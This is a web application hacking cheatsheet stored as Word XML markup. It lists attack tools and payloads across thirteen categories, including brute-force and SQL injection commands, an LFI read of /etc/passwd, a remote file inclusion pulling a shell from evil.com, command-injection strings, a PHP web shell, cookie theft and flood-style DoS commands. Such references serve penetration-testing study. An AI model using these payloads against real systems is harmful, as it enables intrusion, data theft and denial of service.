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Application Hacking – Practical Attack Methodology &amp; Tools Cheatsheet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Gather information about the target web application.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Nmap: `nmap -sV -p 80,443 &lt;target&gt;` (discover web server and versions)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- WhatWeb: `whatweb &lt;target&gt;` (identify technologies)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Wappalyzer (Browser Extension): Detect frameworks, CMS, DB, etc.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Sublist3r: `sublist3r -d &lt;domain&gt;` (subdomain enumeration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Gobuster: `gobuster dir -u &lt;target&gt; -w /path/to/wordlist` (directory brute-force)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Authentication Attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Break or bypass authentication mechanisms.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Hydra: `hydra -l admin -P rockyou.txt &lt;target&gt; http-post-form "/login:username=^USER^&amp;password=^PASS^:F=incorrect"`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Burp Suite: Intruder module → Brute force login fields.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Medusa: `medusa -h &lt;target&gt; -u admin -P passwords.txt -M http`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. SQL Injection (SQLi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Manipulate SQL queries to extract or modify data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Manual Testing: `admin' OR '1'='1 --`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- SQLMap: `sqlmap -u "http://target.com/index.php?id=1" --dbs`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Havij: GUI tool for automated SQL injection (legacy).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Cross-Site Scripting (XSS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Inject malicious scripts into web pages.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Types: Stored, Reflected, DOM-based.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Payload Example: `&lt;script&gt;alert('XSS')&lt;/script&gt;`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- XSStrike: `python xsstrike.py -u "http://target.com?q=test"`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Burp Suite: Scanner to detect reflected XSS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Cross-Site Request Forgery (CSRF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Force a user to execute unwanted actions while authenticated.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Methodology:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Craft malicious HTML form that auto-submits requests.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Burp Suite CSRF POC Generator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Manual HTML: `&lt;form action="http://target.com/change_pw" method="POST"&gt;&lt;input type="hidden" name="password" value="hacked"&gt;&lt;/form&gt;`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Server-Side Request Forgery (SSRF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Trick server into making requests on behalf of attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Example Payload: `http://target.com/fetch?url=http://127.0.0.1:80/admin`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- SSRFmap: `python ssrfmap.py -u "http://target.com/fetch?url=FUZZ" -p payloads.txt`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Burp Suite Repeater → Modify parameters to test internal requests.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. File Inclusion Attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Include local or remote files for code execution.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Types: LFI (Local File Inclusion), RFI (Remote File Inclusion).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- LFI Payload: `http://target.com/index.php?page=../../../../etc/passwd`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- RFI Payload: `http://target.com/index.php?page=http://evil.com/shell.txt`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- DotDotPwn: `dotdotpwn -m http -u "http://target.com/index.php?page=TRAVERSAL"`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Command Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Inject OS commands into application inputs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Example Payload: `; ls -la` OR `&amp;&amp; whoami`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Commix: `python commix.py --url="http://target.com/index.php?id=1" --data="input=test"`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Burp Suite → Send payloads via Repeater.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. File Upload Attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Upload malicious files for code execution.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Example Payload: Upload PHP shell: `&lt;?php system($_GET['cmd']); ?&gt;`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Burp Suite: Modify file upload requests.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Weevely: `weevely generate password shell.php`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>10. Session Management Attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Hijack or manipulate sessions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Stealing Cookies via XSS: `document.cookie`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Burp Suite → Edit session cookies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- THC-Hydra for brute forcing session IDs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>11. Business Logic Flaws</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Exploit flaws in the logic of application workflows.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Examples:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Skipping payment steps.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Modifying product price in parameters.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Burp Suite Repeater → Tamper workflow requests.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- OWASP ZAP → Analyze flows.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>12. Web Server/Tech-Specific Attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Exploit known vulnerabilities in specific web technologies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Examples:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Apache Struts RCE (CVE-2017-5638).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- PHP misconfigurations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Tomcat Manager brute-force.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Nikto: `nikto -h &lt;target&gt;`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Metasploit: `use exploit/multi/http/struts_dmi_exec`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>13. Denial of Service (DoS/DDoS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Goal**: Make web app unavailable to legitimate users.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools &amp; Commands:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Slowloris: `perl slowloris.pl -dns &lt;target&gt;`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- LOIC/HOIC (legacy stress testing).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- hping3: `hping3 -S --flood -p 80 &lt;target&gt;`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